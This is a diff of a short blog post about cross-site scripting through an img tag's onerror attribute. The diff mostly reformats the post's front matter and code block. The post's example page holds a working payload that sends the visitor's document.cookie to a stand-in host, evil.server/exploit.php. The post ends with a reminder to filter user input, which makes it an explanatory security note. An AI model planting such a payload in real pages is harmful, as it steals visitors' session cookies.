@@ -1,15 +1,6 @@
 ---
-author: aaron
-comments: true
-date: 2008-03-20 00:34:06+00:00
 layout: post
-slug: xss-with-img-onerror-attribute
 title: XSS with Img OnError attribute
-wordpress_id: 94
-categories:
-- javascript
-- PHP
-- security
 tags:
 - javascript
 - PHP
@@ -26,20 +17,16 @@ Check out the code below:
 
 Source page without proper filtering:
 
-    
-    <html>
+{% highlight HTML %}
+<html>
     <body>
-    <h1>test</h1>
-    <h2>asdf</h2>
-    <img onerror="this.src='http://evil.server/exploit.php?'+document.cookie" src=""></img>
+        <h1>test</h1>
+        <h2>asdf</h2>
+        <img onerror="this.src='http://evil.server/exploit.php?'+document.cookie" src=""></img>
     </body>
-    </html>
-
-
+</html>
+{% endhighlight %}
 
 Then, on evil.server, place your image.  Finally, top it off with the following code in exploit.php
-
-
-
 
 Easy as that.  Just another reminder to properly filter your use submitted content.
